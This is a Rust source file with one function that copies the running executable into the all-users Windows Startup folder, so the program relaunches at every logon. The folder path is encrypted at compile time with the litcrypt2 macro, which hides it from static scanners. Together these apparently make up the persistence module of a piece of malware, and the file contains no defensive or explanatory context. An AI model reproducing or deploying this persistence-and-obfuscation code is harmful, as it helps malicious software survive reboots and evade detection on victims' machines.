use litcrypt2::lc;
use std::path::{Path, PathBuf};
use std::{env, fs, io};

pub fn copy() -> io::Result<()> {
    let exe_path = env::current_exe()?;
    let exe_name = exe_path.file_name().expect("Executable has no filename");
    let dir_str = lc!("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    let dir_name = Path::new(&dir_str).to_str().unwrap();

    // Build the destination path
    let mut dest_path = PathBuf::from(dir_name);
    fs::create_dir_all(&dest_path)?;
    dest_path.push(exe_name);

    fs::copy(&exe_path, &dest_path)?;

    Ok(())
}
